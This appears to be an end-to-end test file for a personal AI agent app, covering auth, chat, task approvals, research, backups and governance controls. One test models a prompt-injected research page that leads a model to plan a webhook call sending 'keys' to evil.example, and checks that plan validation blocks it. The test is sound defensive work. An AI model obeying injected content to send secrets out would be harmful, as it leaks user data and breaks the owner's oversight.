"""End-to-end tests through the HTTP API: auth, chat streaming, tasks, approvals,
research, code generation with self-test + debug retry, sync, schedules,
learning, ventures, backup/restore and adversarial prompt-injection cases."""
import json
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from threading import Thread
from unittest import mock

from starlette.testclient import TestClient

from sastra.api.app import build
from sastra.backup import create_backup, restore_backup
from sastra.research.search import StaticSearch
from sastra.sandbox.runner import ProcessRunner
from sastra.worker import Worker

from .helpers import FakeLLM, make_app, openai_adapter, priced
from .test_research import RESULTS, fetcher

PW = "a-strong-passphrase"


def login(client, app, username="deep"):
    code = app.auth.setup_code()
    if code:
        r = client.post("/api/setup", json={"username": username, "password": PW, "setup_code": code})
        assert r.status_code == 200, r.text
    r = client.post("/api/auth/login", json={"username": username, "password": PW, "device_name": "pixel"})
    assert r.status_code == 200, r.text
    client.headers["Authorization"] = "Bearer " + r.json()["token"]
    return r.json()


def sse_events(text):
    out = []
    for block in text.strip().split("\n\n"):
        data = [ln[5:] for ln in block.splitlines() if ln.startswith("data:")]
        if data:
            out.append(json.loads(data[0]))
    return out


class AuthApiTests(unittest.TestCase):
    def setUp(self):
        self.app, _ = make_app()
        self.c = TestClient(build(self.app))

    def test_setup_requires_one_time_code(self):
        r = self.c.post("/api/setup", json={"username": "xx", "password": PW, "setup_code": "WRONG"})
        self.assertEqual(r.status_code, 403)
        self.assertEqual(self.app.db.scalar("SELECT COUNT(*) FROM security_events WHERE kind='setup_code_rejected'"), 1)
        login(self.c, self.app)
        r = self.c.post("/api/setup", json={"username": "yy", "password": PW, "setup_code": "ANY"})
        self.assertEqual(r.status_code, 403)

    def test_routes_require_auth_and_sessions_are_revocable(self):
        self.assertEqual(self.c.get("/api/status").status_code, 401)
        login(self.c, self.app)
        self.assertEqual(self.c.get("/api/status").status_code, 200)
        self.assertEqual(self.c.post("/api/auth/logout").status_code, 200)
        self.assertEqual(self.c.get("/api/status").status_code, 401)

    def test_token_in_url_not_accepted(self):
        tok = login(self.c, self.app)["token"]
        anon = TestClient(build(self.app))
        self.assertEqual(anon.get(f"/api/status?token={tok}").status_code, 401)

    def test_lockout_after_failures(self):
        login(self.c, self.app)
        anon = TestClient(build(self.app))
        for _ in range(5):
            anon.post("/api/auth/login", json={"username": "deep", "password": "wrong-password!", "device_name": "x"})
        r = anon.post("/api/auth/login", json={"username": "deep", "password": PW, "device_name": "x"})
        self.assertEqual(r.status_code, 429)  # per-IP login rate limit
        from sastra.auth import AuthError
        with self.assertRaisesRegex(AuthError, "locked"):  # account lockout, independent of IP
            self.app.auth.login("deep", PW, "other-ip")
        self.assertEqual(self.app.db.scalar("SELECT COUNT(*) FROM security_events WHERE kind='account_locked'"), 1)

    def test_totp_second_factor(self):
        login(self.c, self.app)
        from sastra.security.crypto import totp_code
        secret = self.c.post("/api/auth/totp/begin").json()["secret"]
        self.assertEqual(self.c.post("/api/auth/totp/confirm", json={"code": totp_code(secret)}).status_code, 200)
        anon = TestClient(build(self.app))
        self.assertEqual(anon.post("/api/auth/login", json={"username": "deep", "password": PW}).status_code, 401)
        r = anon.post("/api/auth/login", json={"username": "deep", "password": PW, "totp": totp_code(secret)})
        self.assertEqual(r.status_code, 200)
        enc = self.app.db.scalar("SELECT totp_secret_enc FROM users")
        self.assertTrue(enc.startswith("enc1:"))

    def test_security_headers_and_validation(self):
        r = self.c.get("/health")
        self.assertEqual(r.headers["x-frame-options"], "DENY")
        self.assertIn("default-src 'none'", r.headers["content-security-policy"])
        login(self.c, self.app)
        self.assertEqual(self.c.post("/api/tasks", json={"request": ""}).status_code, 422)
        self.assertEqual(self.c.post("/api/tasks", content=b"x" * (13 * 1024 * 1024)).status_code, 413)
        self.assertEqual(self.c.get("/").status_code, 200)


class ChatApiTests(unittest.TestCase):
    def test_streaming_chat_with_cloud_model(self):
        llm = FakeLLM(["Haan ji, Jetpack Compose is a good choice."])
        try:
            app, _ = make_app(adapters=[openai_adapter(llm.url)])
            priced(app)
            c = TestClient(build(app))
            login(c, app)
            c.post("/api/memory", json={"content": "Owner builds Android apps with Kotlin", "category": "preference"})
            r = c.post("/api/chat", json={"message": "Which UI toolkit should I use for my Kotlin android?"})
            ev = sse_events(r.text)
            self.assertEqual(ev[0]["event"], "meta")
            self.assertEqual("".join(e["text"] for e in ev if e["event"] == "delta"), "Haan ji, Jetpack Compose is a good choice.")
            done = ev[-1]
            self.assertEqual((done["event"], done["provider"]), ("done", "openai_compat"))
            system = llm.requests[0]["body"]["messages"][0]["content"]
            self.assertIn("Owner builds Android apps with Kotlin", system)  # memory used as context
            msgs = c.get(f"/api/conversations/{ev[0]['conversation_id']}/messages").json()["messages"]
            self.assertEqual([m["role"] for m in msgs], ["user", "assistant"])
            status = c.get("/api/status").json()
            self.assertEqual(status["model_state"], "cloud_model")
        finally:
            llm.close()

    def test_private_conversation_stays_local(self):
        llm = FakeLLM(["should not be called"])
        try:
            app, _ = make_app(adapters=[openai_adapter(llm.url)])
            priced(app)
            c = TestClient(build(app))
            login(c, app)
            conv = c.post("/api/conversations", json={"title": "diary", "privacy": "private"}).json()
            r = c.post("/api/chat?stream=0", json={"message": "dear diary", "conversation_id": conv["id"]})
            self.assertIn("offline mode", r.json()["text"])
            self.assertEqual(llm.requests, [])
        finally:
            llm.close()

    def test_commands_and_task_routing(self):
        app, _ = make_app()
        c = TestClient(build(app))
        login(c, app)
        r = c.post("/api/chat?stream=0", json={"message": "/remember language: reply in Hinglish"}).json()
        self.assertIn("Saved to memory", r["text"])
        r = c.post("/api/chat?stream=0", json={"message": "Research the latest e-PACS computerisation guidelines for cooperative societies"}).json()
        self.assertTrue(any(e["event"] == "task" for e in r["events"]))
        self.assertIn("research", r["text"])

    def test_offline_sync_is_idempotent(self):
        app, _ = make_app()
        c = TestClient(build(app))
        login(c, app)
        body = {"messages": [{"client_id": "a" * 32, "text": "12*12"}],
                "tasks": [{"client_id": "t1", "request": "2+3"}],
                "memories": [{"client_id": "m1", "content": "Prefers dark mode"}]}
        r1 = c.post("/api/sync", json=body).json()
        r2 = c.post("/api/sync", json=body).json()
        self.assertIn("144", r1["messages"][0]["reply"])
        self.assertEqual(r1["tasks"][0]["task_id"], r2["tasks"][0]["task_id"])
        self.assertEqual(app.db.scalar("SELECT COUNT(*) FROM messages WHERE role='user'"), 1)
        self.assertEqual(app.db.scalar("SELECT COUNT(*) FROM memories"), 1)


class TaskFlowTests(unittest.TestCase):
    def test_research_task_end_to_end(self):
        app, _ = make_app(providers=[StaticSearch(RESULTS)], fetcher=fetcher)
        c = TestClient(build(app))
        login(c, app)
        t = c.post("/api/research", json={"question": "India installed solar capacity 2025"}).json()
        Worker(app).drain()
        detail = c.get(f"/api/tasks/{t['id']}").json()
        self.assertEqual(detail["task"]["state"], "COMPLETED", detail["task"]["error"])
        self.assertIn("## Sources", detail["task"]["result"]["summary"])
        reports = c.get("/api/research").json()["reports"]
        self.assertEqual(len(reports), 1)
        self.assertTrue(c.get(f"/api/research/{reports[0]['id']}").json()["sources"])

    def test_code_task_generates_tests_and_self_debugs(self):
        bad = "```python\ndef add(a, b):\n    return a - b\n\nif __name__ == '__main__':\n    assert add(2, 3) == 5\n    print('ALL TESTS PASSED')\n```"
        good = "```python\ndef add(a, b):\n    return a + b\n\nif __name__ == '__main__':\n    assert add(2, 3) == 5\n    print('ALL TESTS PASSED')\n```"
        llm = FakeLLM([bad, good])
        try:
            app, _ = make_app(adapters=[openai_adapter(llm.url)], sandbox=ProcessRunner())
            priced(app)
            c = TestClient(build(app))
            login(c, app)
            pid = c.post("/api/projects", json={"name": "Adder", "kind": "software"}).json()["id"]
            t = c.post("/api/tasks", json={"request": "Write a python function add(a,b)", "project_id": pid}).json()
            self.assertEqual(t["kind"], "code")
            w = Worker(app)
            for _ in range(6):
                w.drain()
                app.db.execute("UPDATE tasks SET next_run_at = 0 WHERE id = ?", (t["id"],))  # skip backoff wait
            task = app.tasks.get(t["id"])
            self.assertEqual(task["state"], "COMPLETED", task["error"])
            self.assertIn("self-tests passed", task["result"]["verification"])
            self.assertEqual(task["attempts"], 1)
            second_prompt = llm.requests[1]["body"]["messages"][-1]["content"]
            self.assertIn("previous attempt failed", second_prompt)  # error fed back for debugging
            self.assertIn("return a + b", app.projects.read(pid, "main.py"))
            self.assertTrue(any("SASTRA:" in e["message"] for e in app.projects.log(pid)))
        finally:
            llm.close()

    def test_action_needs_approval_then_runs_once(self):
        received = []

        class Hook(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_POST(self):  # noqa: N802
                received.append(self.rfile.read(int(self.headers["Content-Length"])))
                self.send_response(200)
                self.end_headers()

        srv = ThreadingHTTPServer(("127.0.0.1", 0), Hook)
        Thread(target=srv.serve_forever, daemon=True).start()
        url = f"http://127.0.0.1:{srv.server_address[1]}/hook"
        plan = json.dumps({"steps": [{"id": "s1", "type": "tool", "tool": "webhook_send", "args": {"url": url, "text": "Meeting at 5"}}]})
        llm = FakeLLM([plan])
        try:
            app, _ = make_app(adapters=[openai_adapter(llm.url)])
            priced(app)
            c = TestClient(build(app))
            login(c, app)
            t = c.post("/api/tasks", json={"request": f"Send 'Meeting at 5' to my webhook {url}"}).json()
            self.assertEqual(t["kind"], "action")
            with mock.patch("sastra.tools.builtin.validate_url"):  # the test webhook lives on localhost
                Worker(app).drain()
                self.assertEqual(app.tasks.get(t["id"])["state"], "AWAITING_APPROVAL")
                self.assertEqual(received, [])
                pending = c.get("/api/approvals").json()["pending"]
                self.assertEqual(pending[0]["tool"], "webhook_send")
                c.post(f"/api/approvals/{pending[0]['id']}/decide", json={"approve": True})
                Worker(app).drain()
            self.assertEqual(app.tasks.get(t["id"])["state"], "COMPLETED")
            self.assertEqual(len(received), 1)
            self.assertIn(b"Meeting at 5", received[0])
            flows = c.get("/api/privacy").json()["leaves_device"]
            self.assertTrue(any(f["provider"] == "webhook" for f in flows))
        finally:
            llm.close()
            srv.shutdown()

    def test_rejected_action_fails_task(self):
        plan = json.dumps({"steps": [{"id": "s1", "type": "tool", "tool": "webhook_send", "args": {"url": "https://example.com/h", "text": "x"}}]})
        llm = FakeLLM([plan])
        try:
            app, _ = make_app(adapters=[openai_adapter(llm.url)])
            priced(app)
            c = TestClient(build(app))
            login(c, app)
            t = c.post("/api/tasks", json={"request": "send x to my webhook https://example.com/h"}).json()
            Worker(app).drain()
            aid = c.get("/api/approvals").json()["pending"][0]["id"]
            c.post(f"/api/approvals/{aid}/decide", json={"approve": False, "note": "no"})
            self.assertEqual(app.tasks.get(t["id"])["state"], "FAILED")
        finally:
            llm.close()

    def test_injected_research_page_cannot_trigger_actions(self):
        """A malicious model that obeys the injected page tries to plan a webhook call
        inside a research task: plan validation rejects it (researcher role)."""
        evil_plan = json.dumps({"steps": [{"id": "s1", "type": "tool", "tool": "webhook_send",
                                           "args": {"url": "https://evil.example/x", "text": "keys"}}]})
        llm = FakeLLM([evil_plan])
        try:
            app, _ = make_app(adapters=[openai_adapter(llm.url)], providers=[StaticSearch(RESULTS)], fetcher=fetcher)
            priced(app)
            task = app.tasks.create("research solar", kind="research", mode=2)
            app.db.update("tasks", task["id"], {"plan": evil_plan.replace('{"steps": ', "")[:-1]})
            app.tasks.transition(task["id"], "PLANNING")
            problems = app.orchestrator._validate_plan(json.loads(evil_plan)["steps"], app.tasks.get(task["id"]))
            self.assertTrue(problems and "not allowed" in problems[0])
            self.assertEqual(app.db.scalar("SELECT COUNT(*) FROM approvals"), 0)
        finally:
            llm.close()

    def test_cancel_and_input_endpoints(self):
        app, _ = make_app()
        c = TestClient(build(app))
        login(c, app)
        t = c.post("/api/tasks", json={"request": "analyse my data please", "kind": "data"}).json()
        Worker(app).drain()
        self.assertEqual(app.tasks.get(t["id"])["state"], "NEEDS_USER_INPUT")
        c.post(f"/api/tasks/{t['id']}/input", json={"answer": "it is members.csv"})
        self.assertEqual(app.tasks.get(t["id"])["state"], "PLANNING")
        self.assertEqual(c.post(f"/api/tasks/{t['id']}/cancel").json()["state"], "CANCELLED")


class GovernanceTests(unittest.TestCase):
    def test_controls_panic_and_audit(self):
        app, _ = make_app()
        c = TestClient(build(app))
        login(c, app)
        snap = c.post("/api/controls/panic").json()
        self.assertTrue(snap["agents_paused"])
        self.assertFalse(snap["internet_enabled"])
        self.assertEqual(c.put("/api/controls", json={"disabled_tools": ["nope"]}).status_code, 422)
        self.assertTrue(c.get("/api/audit/verify").json()["intact"])
        self.assertIn("controls.panic", [e["action"] for e in c.get("/api/audit").json()["entries"]])

    def test_scheduler_only_in_mode_3(self):
        app, _ = make_app()
        sid = app.scheduler.create("daily", "news on solar", "research", None, 60, None, 0.05, "owner")
        app.db.update("schedules", sid, {"next_run_at": 0})
        self.assertEqual(app.scheduler.tick(), [])
        app.controls.set("autonomy_mode", 3, "owner")
        created = app.scheduler.tick()
        self.assertEqual(len(created), 1)
        t = app.tasks.get(created[0])
        self.assertEqual((t["mode"], t["limits"]["max_cost_usd"]), (3, 0.05))
        self.assertEqual(app.scheduler.tick(), [])  # not due again yet

    def test_learning_loop_governance(self):
        app, _ = make_app()
        L = app.learning
        lid = L.propose("memory.search.min_score", 0.1, "obs", "raise threshold")
        self.assertIsNone(L.propose("memory.search.min_score", 0.2, "dup", "dup"))
        res = L.test(lid, lambda v: 0.9 if v == 0.1 else 0.5)
        self.assertTrue(res["improved"])
        with self.assertRaises(PermissionError):
            pid = L.propose("router.preference", ["anthropic"], "obs", "routing change")
            L.test(pid, lambda v: 1.0 if v else 0.0)
            L.apply(pid, "learning", by_owner=False)
        L.apply(lid, "owner", by_owner=True)
        self.assertEqual(L.param("memory.search.min_score"), 0.1)
        L.rollback("memory.search.min_score", "owner")
        self.assertEqual(L.param("memory.search.min_score"), 0.05)
        bad = L.propose("research.max_sources", 99, "obs", "more")
        self.assertEqual(json.loads(app.db.scalar("SELECT proposal FROM lessons WHERE id = ?", (bad,)))["value"], 10)  # clamped

    def test_ventures_separate_verified_from_forecast(self):
        app, _ = make_app()
        v = app.ventures.create("Tiffin centre app", "Office workers will pre-order lunch", 50, None, "owner")
        with self.assertRaises(ValueError):
            app.ventures.add_entry(v["id"], "revenue", 500, "INR", "verified", "first week", "", "owner")
        app.ventures.add_entry(v["id"], "revenue", 500, "INR", "verified", "first week", "UPI ref 12345", "owner")
        app.ventures.add_entry(v["id"], "revenue", 20000, "INR", "forecast", "month 3", "", "owner")
        s = app.ventures.summary(v["id"])
        self.assertEqual(s["totals_by_basis"]["verified"]["INR"]["revenue"], 500)
        self.assertEqual(s["totals_by_basis"]["forecast"]["INR"]["revenue"], 20000)

    def test_encrypted_backup_and_restore(self):
        app, tmp = make_app()
        app.memory.add("Remember the orchard plan", "project", source="owner")
        pid = app.projects.create("Orchard")["id"]
        app.projects.write(pid, "plan.md", "mango, guava", "t")
        out = create_backup(app)
        blob = Path(out["file"]).read_bytes()
        self.assertNotIn(b"orchard", blob.lower())
        target = tmp / "restored"
        info = restore_backup(Path(out["file"]), target, app.settings.data_key_b64)
        self.assertEqual(info["manifest"]["version"], 1)
        import sqlite3
        rows = sqlite3.connect(target / "sastra.db").execute("SELECT content FROM memories").fetchall()
        self.assertEqual(rows[0][0], "Remember the orchard plan")
        self.assertEqual((target / "workspaces" / pid / "plan.md").read_text(), "mango, guava")
        with self.assertRaises(Exception):
            from sastra.security.crypto import generate_data_key
            restore_backup(Path(out["file"]), tmp / "r2", generate_data_key())

    def test_backup_refuses_without_key(self):
        app, _ = make_app(with_key=False)
        with self.assertRaises(RuntimeError):
            create_backup(app)

    def test_metrics_and_budget_endpoints(self):
        app, _ = make_app()
        c = TestClient(build(app))
        login(c, app)
        c.post("/api/tasks", json={"request": "2+2"})
        Worker(app).drain()
        m = c.get("/api/metrics").json()
        self.assertEqual(m["task_success_rate"], 1.0)
        self.assertEqual(c.put("/api/budget", json={"daily_usd": 1, "monthly_usd": 20}).json()["daily_usd"], 1.0)
        self.assertEqual(c.put("/api/budget/pricing", json={"provider_model": "anthropic:claude-x", "input_per_m": 1, "output_per_m": 5}).status_code, 200)

    def test_retention_deletes_old_messages(self):
        app, _ = make_app()
        list(app.chat.send("hello", conversation_id=None, project_id=None, actor="o"))
        app.db.execute("UPDATE messages SET created_at = 0")
        app.db.execute("UPDATE conversations SET updated_at = 0")
        self.assertEqual(app.chat.apply_retention(30), 2)
        self.assertEqual(app.db.scalar("SELECT COUNT(*) FROM conversations"), 0)


if __name__ == "__main__":
    unittest.main()
